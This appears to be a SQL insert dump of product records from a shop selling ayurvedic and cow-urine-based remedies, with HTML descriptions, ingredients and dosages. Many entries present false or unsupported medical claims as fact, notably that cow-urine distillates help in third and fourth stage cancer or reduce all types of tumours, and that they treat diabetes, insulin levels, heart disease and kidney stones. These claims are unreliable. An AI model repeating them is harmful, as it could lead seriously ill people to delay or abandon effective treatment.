(2, 1, 12, 0, 'Arjunadi Gritha', '', 'arjunadi-gritha', 1, 1, '0002', 0, '<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"10\">For Heart-Related Problems</p>\r\n<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"11\">Arjun Ghrita is very useful for heart-related issues. It is one of the most ancient ayurvedic formulas to keep your heart healthy, keep your cholesterol in check, and control your blood pressure.</p>\r\n<p><strong>Ingredients:</strong> &nbsp;</p>\r\n<ul>\r\n<li>Arjuna Swarasa</li>\r\n<li>Gogritha</li>\r\n<li>Arjuna Kalka &nbsp; &nbsp; &nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-06 10:53:25', '2022-11-11 11:02:37', 1, 1, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage: </strong>3 to 6 gms twice a day or as directed by the ayurvedic doctor.</p>', '', '', ''),
(3, 1, 12, 0, 'C-19 Ark', '', 'c-19-ark', 1, 1, '0003', 0, '<p>It is a prevention ark that helps in balancing the tridosh, so diseases are prevented. It has amazing germicidal power to kill all germs causing diseases.</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Double distilled ark with Punarnava</li>\r\n<li>Tulsi</li>\r\n<li>Amruthaballi</li>\r\n<li>Sadabahar</li>\r\n<li>Ashwagandha. &nbsp; &nbsp; &nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-06 11:55:18', '2022-10-12 06:04:11', 1, 0, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> Take 15ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor&nbsp;</p>', '', '', ''),
(4, 1, 12, 0, 'Goumutra Ark', '', 'goumutra-arka-plain', 1, 1, 'Ka/GMA/01', 0, '<p>For blood purification on daily basis</p>\r\n<p>Helps in all types of vata and Kapha disease. It boosts your immune system. Acts as an anti-toxin and helps you detoxify your body system.</p>\r\n<p>&nbsp;Ingredients:</p>\r\n<ul>\r\n<li>&nbsp;Cow Urine &nbsp; &nbsp; &nbsp;</li>\r\n</ul>', 1, '2022-04-06 12:04:01', '2022-08-03 05:01:12', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Take 15 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(5, 1, 12, 0, 'Gomuthra Ark Shadabahar', '', 'goumutra-ark-shadabahar', 1, 1, '0005', 0, '<p>For BP, Diabetics, Cancer Care</p>\r\n<p>Helps in the 3rd &amp; 4th stages of cancer &amp; Boosts immunity.</p>\r\n<p><strong>Ingredients:</strong> &nbsp;</p>\r\n<ul>\r\n<li>Cow Urine</li>\r\n<li>Fennel Seeds</li>\r\n<li>Cumin</li>\r\n<li>Shadabahar &nbsp; &nbsp;</li>\r\n</ul>', 1, '2022-04-06 12:08:58', '2022-11-11 11:03:31', 1, 0, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> Take 15 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(6, 1, 12, 0, 'Gomutra Ark Insulin', '', 'gomutra-ark-insulin', 1, 1, '0006', 0, '<p>For Anti Diabetic</p>\r\n<p>Helps treat diabetes, high sugar, weight management and regulates insulin levels &amp; Increases immunity. &nbsp;</p>\r\n<p>Ingredients:</p>\r\n<ul>\r\n<li>Cow Urine</li>\r\n<li>Saptharangi</li>\r\n<li>Fennel Seeds</li>\r\n<li>Cumin</li>\r\n</ul>', 1, '2022-04-06 12:10:50', '2022-11-11 11:03:43', 1, 0, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> Take 15ml twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(7, 1, 12, 0, 'Gomutra Ark Simarouba', '', 'gomutra-ark-simarouba', 1, 1, '0007', 0, '<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"18\">For Cancer Care</p>\r\n<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"19\">Kashaya Amrutham ( KA) is processed with Desi Cow Gomutra. It helps in the 3rd and 4th stages of cancer &amp; It increases immunity.&nbsp;</p>\r\n<p><strong>Ingredients: </strong>&nbsp;</p>\r\n<ul>\r\n<li>Desi Cow Goumuthram</li>\r\n<li>Kanchanar</li>\r\n<li>Simarouba</li>\r\n<li>Other herbs</li>\r\n</ul>', 1, '2022-04-06 12:14:38', '2022-11-11 11:03:56', 1, 0, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> Take 15ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(8, 1, 12, 0, 'Panchagavya Gritha', '', 'panchagavya-gritha', 1, 1, '0008', 0, '<p>For Anti-oxidant &amp; Immune Development, an Immunity booster acts as an anti-oxidant. &nbsp;</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Bharatiya Gomatha</li>\r\n<li>Dhahi</li>\r\n<li>Gritha</li>\r\n<li>Gomutra</li>\r\n<li>Gomaya Rasa &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>\r\n</ul>', 1, '2022-04-06 12:19:18', '2022-11-11 11:04:48', 1, 0, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> As directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(9, 1, 12, 0, 'Takra Amrutham Ark', '', 'takramrutha', 1, 1, 'KA/TA/01', 0, '<p>For cleaning of the stomach, Big intestine, Small intestine, Gastric &amp; Acidity problems</p>\r\n<p>&nbsp;Ingredients:</p>\r\n<ul>\r\n<li>Amla</li>\r\n<li>Pepper</li>\r\n<li>Ajvain</li>\r\n<li>Takra</li>\r\n<li>Saindalavanga</li>\r\n<li>Harale</li>\r\n<li>Black rock salt&nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-06 12:22:33', '2022-08-03 05:03:58', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Take 15 ml mixed with water twice a day, morning &amp; evening in an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(10, 1, 12, 0, 'Parijatha Ark', '', 'parijatha-ark', 1, 1, 'KA/PJA/01', 0, '<p>For Arthritis</p>\r\n<p>Helps in arthritis, sciatica, back &amp; body aches, and joint problems &amp; Increases immunity. &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Cow Urine</li>\r\n<li>Parijaat</li>\r\n<li>Fennel Seeds</li>\r\n<li>Cumin &nbsp; &nbsp; &nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-06 12:27:07', '2022-08-03 05:05:17', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Take 15 ml mixed with water on an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(11, 1, 12, 0, 'Kanchanahara Ark', '', 'kanchanahara-ark', 1, 1, '0011', 0, '<p>For Cancer</p>\r\n<p>Reduces all types of cancer tumors, Increases immunity.</p>\r\n<p><strong>Ingredients: </strong>&nbsp;</p>\r\n<ul>\r\n<li>Cow Urine</li>\r\n<li>Kanchanahara</li>\r\n<li>Fennel Seeds</li>\r\n<li>Cumin</li>\r\n</ul>', 1, '2022-04-06 12:30:48', '2022-11-11 11:04:16', 1, 0, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> Take 15 ml mixed with water on an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(13, 1, 12, 0, 'Bal Pal Ras', '', 'bal-pal-ras', 1, 1, '0012', 0, '<p>For Children Immunity</p>\r\n<p>Helps in reducing cold, and cough &amp; improves hunger in children, and Increases immunity. &nbsp;</p>\r\n<p><strong>Ingredients: </strong>&nbsp;</p>\r\n<ul>\r\n<li>Shatavari Ark</li>\r\n<li>Organic Sugar &nbsp; &nbsp; &nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-07 03:56:44', '2022-11-11 11:05:00', 1, 0, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> Take 5 ml mixed with water twice a day after food or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(14, 1, 12, 0, 'Nari Sanjeevani Ark Spl', '', 'narisanjeevani-ark-spl', 1, 1, 'KA/NSA/01', 0, '<p>For uterus related problems</p>\r\n<p>A complete medicine for all common gynae problems. Helps in regularizing the menstrual cycle, reducing pain, and menopause.</p>\r\n<p>&nbsp;Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Shatavari Ark</li>\r\n<li>Organic Sugar</li>\r\n<li>Sita Ashok, Brahmi&nbsp; &nbsp;</li>\r\n</ul>', 1, '2022-04-07 04:00:55', '2022-08-03 05:10:04', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Take 10 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(15, 1, 12, 0, 'Narisanjeevani Spl', '', 'narisanjeevani-ark', 1, 1, '06', 0, '<p>For uterus-related problems</p>\r\n<p>A complete medicine for all common gynae problems. Helps in regularizing the menstrual cycle, reducing pain, and menopause.</p>\r\n<p>&nbsp;<strong>Ingredients: &nbsp;</strong></p>\r\n<ul>\r\n<li>Shatavari Ark</li>\r\n<li>Organic sugar</li>\r\n<li>Sita Ashok</li>\r\n<li>Bahrami &nbsp; &nbsp; &nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-07 04:04:16', '2022-11-11 11:05:08', 1, 0, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> Take 10 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(16, 1, 12, 0, 'Sarpagandha Ark', '', 'sarpgandha-ark', 1, 1, 'kA/SAG/01', 0, '<p>For all types of cancer diseases, BP</p>\r\n<p>Helps the patients in 1st phase of cancer, purifying blood without increasing or decreasing blood pressure. &nbsp;</p>\r\n<p>&nbsp; Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Cow Urine</li>\r\n<li>Sarpgandha</li>\r\n<li>Anise</li>\r\n<li>Cumin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>\r\n</ul>', 1, '2022-04-07 04:07:36', '2022-08-03 05:11:02', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(17, 1, 12, 0, 'Saptharangi Ark', '', 'saptharangi-ark', 1, 1, 'KA/SPR/01', 0, '<p>For diabetic Problems</p>\r\n<p>Suitable to control sugar levels. Increases immunity. &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Cow Urine</li>\r\n<li>Saptharangi</li>\r\n<li>Fennel Seeds</li>\r\n<li>Cumin&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-07 04:19:06', '2022-08-03 05:11:27', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(18, 1, 12, 0, 'Pashanbhed Ark', '', 'pashanabedh-ark', 1, 1, 'KA/PA/01', 0, '<p>Removes stone from any part of the body</p>\r\n<p>Helps in curing kidney and gall bladder stone problems. Increases immunity. &nbsp; &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Cow Urine</li>\r\n<li>Pashanbhed</li>\r\n<li>Fennel Seeds</li>\r\n<li>Cumin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-07 04:21:21', '2022-10-12 12:14:05', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(19, 1, 12, 0, 'Nandi Ark', '', 'nandi-ark', 1, 1, '0018', 0, '<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"20\">Infertility problems in men and women</p>\r\n<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"21\">It promotes male and female fertility, increases testosterone, and boosts immunity.</p>\r\n<p><strong>Ingredients: &nbsp;</strong></p>\r\n<ul>\r\n<li>Nandi Urine</li>\r\n<li>Moringa leaves</li>\r\n<li>Fennel Seeds</li>\r\n<li>Cumin &nbsp; &nbsp; &nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-07 04:33:08', '2022-11-11 11:03:16', 1, 0, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(20, 1, 12, 0, 'Giloy Ark', '', 'giloya-ark', 1, 1, 'KA/GA/01', 0, '<p>Reduces fatness &amp; works as an antibiotic agent in our body</p>\r\n<p>It helps in reducing weight. It acts as an antibiotic agent in our body &amp; Increases immunity. &nbsp; &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Cow Urine</li>\r\n<li>Saffron</li>\r\n<li>Anise</li>\r\n<li>Fennel Seeds</li>\r\n<li>Cumin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>\r\n</ul>', 1, '2022-04-07 04:37:23', '2022-08-03 05:12:58', 0, 1, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(21, 1, 12, 0, 'Arjuna Ark', '', 'arjuna-ark', 1, 1, '0020', 0, '<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"22\">For Heart-Related Problems</p>\r\n<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"23\">It helps in curing heart problems, balancing cholesterol, controlling blood pressure, and increasing immunity.</p>\r\n<p>&nbsp;</p>\r\n<p><strong>Ingredients: </strong>&nbsp;</p>\r\n<ul>\r\n<li>Cow Urine</li>\r\n<li>Arjun</li>\r\n<li>Fennel Seeds</li>\r\n<li>Cumin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>\r\n</ul>', 1, '2022-04-07 04:40:12', '2022-11-11 11:02:31', 1, 0, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> Take 15 ml in the morning and evening on an empty stomach with water or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(22, 1, 12, 0, 'Tulsi Ark', '', 'tulsi-ark', 1, 1, 'KA/TA/01', 0, '<p>For kapha &amp; thyroid related diseases</p>\r\n<p>Helps in curing cough, cold, viral infection, thyroid, sore throat, fever, and Increases immunity. &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Cow Urine</li>\r\n<li>Tulasi</li>\r\n<li>Fennel Seeds</li>\r\n<li>Cumin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>\r\n</ul>', 1, '2022-04-07 04:43:24', '2022-08-03 05:14:42', 0, 1, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Take 15 ml in the morning and evening on an empty stomach with water or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(23, 1, 12, 0, 'Punarnava Ark', '', 'punarnava-ark', 1, 1, '0022', 0, '<p>For Liver &amp; Kidney Related Problems</p>\r\n<p>Helps in curing liver &amp; kidney-related problems. Helps in urinary tract infections, Kidney problems, and Prostate Problems, and increases immunity. &nbsp; &nbsp;</p>\r\n<p><strong>Ingredients: &nbsp;</strong></p>\r\n<ul>\r\n<li>Cow Urine</li>\r\n<li>Punarnava</li>\r\n<li>Fennel Seeds</li>\r\n<li>Cumin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>\r\n</ul>', 1, '2022-04-07 04:47:19', '2022-11-11 11:03:07', 1, 1, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> Take 15 ml in the morning &amp; evening on an empty stomach with water or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(24, 1, 12, 0, 'Harisingar Ark', '', 'harisingar-ark', 1, 1, '0023', 0, '<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"24\">For Arthritis</p>\r\n<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"25\">Kashaya Amrutham is processed with Desi Cow Gomutra. It is useful in arthritis and is good for joint-related disorders.&nbsp;&nbsp;</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Gomutra ark</li>\r\n<li>Harisringar</li>\r\n<li>Cumin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>\r\n</ul>', 1, '2022-04-07 04:49:46', '2022-11-11 11:03:03', 1, 1, '', '', 0, 0, 0, '12%', 0, '<p><strong>Dosage:</strong> Take 15ml Ark, twice a day. Take early in the morning (with an Empty Stomach) and at night before going to bed. A patient having bile acidity is to take this medicine with water. Do not eat or drink before and after 30 mins of taking this medicine. Or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(25, 1, 12, 0, 'Chandrama Ark', '', 'chandrama-ark', 1, 1, '0024', 0, '<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"26\">For Stomach and Skin Diseases</p>\r\n<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"27\">Kashaya Amrutham is processed with Desi Cow Gomutra. It helps cure various health problems. It improves digestion and increases immunity.&nbsp; &nbsp;</p>\r\n<p><strong>Ingredients: </strong>&nbsp;</p>\r\n<ul>\r\n<li>Cow Urine</li>\r\n<li>Anise</li>\r\n<li>Cumin &nbsp; &nbsp;</li>\r\n</ul>', 1, '2022-04-07 04:52:19', '2022-11-11 11:02:58', 1, 1, '', '', 0, 0, 0, '12%', 0, '<p><strong>Dosage:</strong> Take 15 ml Ark, twice a day. Take early in the morning (with an Empty Stomach) and at night before going to bed. A patient having bile acidity is to take this medicine with water. Do not eat or drink before and after 30 mins of taking this medicine or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(26, 4, 13, 0, 'Sanjeevani Vati (AAGD)', '', 'sanjeevani-vati-aagd', 1, 1, '0001', 0, '<p>For All Kinds Of Pain Relief &amp; Immune Development</p>\r\n<p>Helps in relieving all kinds of pain, beneficial in chronic fever, cough, cold, respiratory tract infections, and other viral infections. Increases immunity. &nbsp;</p>\r\n<p>Ingredients:</p>\r\n<p>Gaumutra Ghan, Sarpagandha Powder. &nbsp; &nbsp; &nbsp;</p>', 1, '2022-04-07 05:59:48', '2022-04-12 12:02:42', 0, 1, '', '', 0, 0, 0, '12', 0, '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(27, 4, 13, 0, 'Sarphagandha Ghanavati', '', 'sarphagandha-ghanavati', 1, 1, '0025', 0, '<p>All Types Of Cancer Related Problems</p>\r\n<p>Helps in 1st stage of cancers, purifying blood, controlling high BP, Increases immunity. &nbsp;</p>\r\n<p>Ingredients:</p>\r\n<p>Gaumutra Ghan, Sarpagandha Powder &nbsp; &nbsp; &nbsp;&nbsp;</p>', 1, '2022-04-07 06:03:42', '2022-04-12 10:51:44', 0, 1, '', '', 0, 0, 0, '12', 0, '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(28, 4, 13, 0, 'Saptharangi Ghanavati', '', 'saptharangi-ghanavati', 1, 1, '0002', 0, '<p>For Diabetes Problems</p>\r\n<p>Helps in diabetes control, Increases immunity. &nbsp;</p>\r\n<p>Ingredients:</p>\r\n<p>Gaumutra ghan, Saptharangi Powder &nbsp; &nbsp; &nbsp; &nbsp;</p>', 1, '2022-04-07 06:05:13', '2022-04-12 10:49:57', 0, 1, '', '', 0, 0, 0, '12', 0, '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(29, 4, 13, 0, 'Panchagavya Ghanavati', '', 'panchagavya-ghanavati', 1, 1, '0003', 0, '<p>For Normal Health &amp; All Kinds Of Diseases</p>\r\n<p>Helps in digestion, reduces constipation. Increases immunity. &nbsp;</p>\r\n<p>Ingredients:</p>\r\n<p>Gaumutra Ghan, Triphala Powder &nbsp; &nbsp; &nbsp;&nbsp;</p>', 1, '2022-04-07 06:07:51', '2022-06-01 10:23:22', 0, 1, '', '', 0, 0, 0, '12', 0, '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(30, 4, 13, 0, 'Triphala Ghanavati', '', 'triphala-ghanavati', 1, 1, '0004', 0, '<p>For Normal Health &amp; All Kinds Of Diseases</p>\r\n<p>Helps in digestion, and reduces constipation. Increases immunity.</p>\r\n<p>&nbsp;Ingredients:</p>\r\n<p>Gaumutra Ghan, Triphala Powder &nbsp; &nbsp; &nbsp;&nbsp;</p>', 1, '2022-04-07 06:11:33', '2022-04-12 10:39:49', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(31, 4, 13, 0, 'Arjuna Ghanavati', '', 'arjuna-ghanavati', 1, 1, '0005', 0, '<p>For Heart Related Problem</p>\r\n<p>Helps in balancing cholesterol, controlling blood pressure. Increases immunity. &nbsp;</p>\r\n<p>Ingredients:</p>\r\n<p>Gaumutra Ghan, Arjun Powder &nbsp; &nbsp; &nbsp;&nbsp;</p>', 1, '2022-04-07 06:14:30', '2022-11-11 11:02:26', 1, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(32, 4, 13, 0, 'Tulsi Ghanavati', '', 'tulsi-ghanavati', 1, 1, '0006', 0, '<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"6\">For Kapha &amp; Synus Related Problems.</p>\r\n<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"7\">It helps with coughs, colds, sore throats, viral infections, fevers, and increases immunity.</p>\r\n<p>&nbsp;&nbsp;</p>\r\n<p>Ingredients:</p>\r\n<p>Gaumutra Ghan, Tulasi Powder &nbsp; &nbsp; &nbsp;&nbsp;</p>', 1, '2022-04-07 06:16:02', '2022-06-15 12:15:16', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(33, 4, 13, 0, 'Nandi Ghanavati', '', 'nandi-ghanavati', 1, 1, '0007', 0, '<p>For Infertility Problems</p>\r\n<p>Helps in increasing fertility in men. &nbsp;</p>\r\n<p>Ingredients:</p>\r\n<p>Nandimutra Ghan, Drumstick Powder &nbsp; &nbsp; &nbsp;&nbsp;</p>', 1, '2022-04-07 06:17:41', '2022-04-12 10:32:10', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(34, 4, 13, 0, 'Punarnava Ghanavati', '', 'punarnava-ghanavati', 1, 1, '0008', 0, '<p>For Liver Related Problems</p>\r\n<p>Helps with urinary tract infection, kidney problems, prostate problems, Increases immunity. &nbsp;</p>\r\n<p>Ingredients:</p>\r\n<p>Gaumutra Ghan, Punarnava Powder &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>', 1, '2022-04-07 06:19:17', '2022-04-12 10:29:50', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
(115, 13, 45, 0, 'Black Rice', '', 'black-rice', 1, 1, 'GA/OP/R/BR', 0, '<p>Description</p>', 1, '2022-08-03 05:33:57', '2022-08-10 06:34:21', 0, 1, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(114, 12, 26, 0, 'Ghee Diya Batti', '', 'cowdung-ghee-batti', 1, 1, '', 0, '<p>Lighting Cow Ghee Deepam increases sattvic tattva purifying the mind. It is our culture to light cow ghee Diya&rsquo;s for health, wealth, and happiness. Pure Cow Ghee Battis made from cow ghee are a convenient and apt replacement for traditional ghee lamps. This Pure Cow Ghee Batti has a burning time of 20&ndash;30 minutes. Put these Diya Batti in a Diya and light them.</p>\r\n<p>Ingredients:</p>\r\n<ul>\r\n<li>Cowdung</li>\r\n<li>Gomutra</li>\r\n<li>Milk</li>\r\n<li>Curd</li>\r\n<li>Ghee</li>\r\n<li>Joss</li>\r\n<li>Cotton Wick</li>\r\n</ul>', 1, '2022-07-20 07:18:52', '2022-11-11 10:57:34', 0, 0, '', '', 0, 0, 0, '12%', 0, '<p>Place the ghee batti on the Diya&rsquo;s or aarti and light them with a matchstick.</p>', '', '', ''),
(36, 5, 14, 0, 'Gavya Madhu Meha Churna', '', 'gavya-madhu-meha-churna', 1, 1, '0001', 0, '<p>For Diabetes Problems</p>\r\n<p>Helps to control Blood sugar and related problems arise there from. Maintains healthy blood sugar level that is already within normal limits. &nbsp;</p>\r\n<p>Ingredients</p>\r\n<p>Saptarangi Powder, Gudmaar Powder,Tejpatta Powder, Chiraita Powder, Methi Powder, Jambul Seed Powder &nbsp; &nbsp;&nbsp;</p>', 1, '2022-04-07 06:48:36', '2022-04-13 09:38:35', 0, 1, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water twice a day, or as directed by the Ayurvedic doctor.&nbsp;</p>', '', '', ''),
(37, 5, 14, 0, 'Gavya Triphala Churna', '', 'gavya-triphala-churna', 1, 1, '0002', 0, '<p>For Constipation, Piles, Fat, Burn, Blood Thinner, Balances Tridoshas</p>\r\n<p>Helpful in all stomach-related problems such as indigestion, acidity. &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<p>Amla, Baheda, Harde, Cow Urine &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</p>', 1, '2022-04-07 06:52:23', '2022-04-13 09:37:16', 0, 1, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water, or as directed by the Ayurvedic Doctor.&nbsp;</p>', '', '', ''),
(38, 5, 14, 0, 'Gavya Pitta Shamana Churna', '', 'gavya-pitta-shamana-churna', 1, 1, '0003', 0, '<p>Reduces High Pitta &amp; For Digestion</p>\r\n<p>Helpful in all stomach-related problems such as Bile, indigestion, Acidity. &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<p>Anise, Cumin, Celery, Black Salt, Sindhav Salt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>', 1, '2022-04-07 06:58:15', '2022-04-13 09:33:54', 0, 1, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water, or as may be directed by the Ayurvedic doctor.&nbsp;</p>', '', '', ''),
(40, 6, 15, 0, 'Panchgavya Facial Powder', '', 'panchagavya-facial-powder', 1, 1, '0001', 0, '<p>For Black Spots &amp; Beautiful Face</p>\r\n<p>Medicine for acne, pimple, and all face skin-related problems. It helps in removing black spots and pimples.</p>\r\n<p>Ingredients</p>\r\n<p>Butter, Pancha Gavya, Multani Mitti &nbsp; &nbsp; &nbsp;&nbsp;</p>', 1, '2022-04-07 07:12:00', '2022-07-27 06:25:36', 1, 1, '', '', 0, 0, 0, '18', 0, '<p>Dosage: For oily skin use it with milk and for dry skin use it with water before going to bed or on any suitable time or as directed by gavya siddh.&nbsp;</p>', '', '', ''),
(41, 6, 15, 0, 'Panchagavya Snana Churna', '', 'panchagavya-snana-churna', 1, 1, '0002', 0, '<p>For Bath</p>\r\n<p>Removes dead skin cells and helps retain the naturally soft feel of your skin. &nbsp;</p>\r\n<p>Ingredients</p>\r\n<ul>\r\n<li>Pancha Gavya</li>\r\n<li>Multani Mitti &nbsp; &nbsp; &nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-07 07:23:56', '2022-07-26 12:15:25', 0, 1, '', '', 0, 0, 0, '18', 0, '<p>Dosage: Use it with water while taking bath, or at any suitable time of the day or as directed by Gavya siddh.&nbsp;</p>', '', '', ''),
(42, 6, 15, 0, 'Dantamanjan', '', 'gomayadi-dantamanjan', 1, 1, 'SA/DM/01', 0, '<p>For teeth &amp; mouth related problems</p>\r\n<p>Gou Danth tooth powder prevents common dental problems which harm gums, and teeth and resists bad breath fights with germs and bacteria which affect your tooth. It strengthens your teeth and will give you a healthy dental life.</p>\r\n<p>Ingredients :</p>\r\n<ul>\r\n<li>Gomaya Bhasmam</li>\r\n<li>Clove Nutmeg</li>\r\n<li>Amruthadhara Coriander</li>\r\n<li>Tulasi</li>\r\n<li>Peppermint Himalayan Rock Salt</li>\r\n<li>Panchagavyam</li>\r\n<li>Black Pepper</li>\r\n</ul>', 1, '2022-04-07 07:27:45', '2022-08-03 05:23:05', 0, 1, '', '', 0, 0, 0, '18', 0, '<p>Brush teeth with tooth powder twice a day</p>', '', '', ''),
